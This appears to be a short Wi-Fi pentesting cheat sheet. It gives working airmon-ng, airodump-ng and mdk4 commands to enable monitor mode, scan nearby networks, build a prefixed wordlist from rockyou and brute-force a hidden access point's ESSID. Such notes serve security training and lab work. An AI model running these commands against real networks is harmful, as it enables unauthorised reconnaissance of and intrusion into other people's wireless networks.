### Setup 

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Identify the network

Identify the network by launching an airodump scan:
```bash
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --wps
sudo airodump-ng wlan0mon --band abg --wps --manufacturer
```


### Brute force attack

A brute force attack can be performed to guess the AP ESSID. In this example, all networks have the "wifi-" prefix, a custom wordlist must be generated:
```bash
cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
```

Switch to channel 11:
```bash
iwconfig wlan0mon channel 11
```

Use mdk4 to brute force the AP name:
```bash
mdk4 wlan0mon p -t <BSSID> -f ~/wifi-rockyou.txt
```
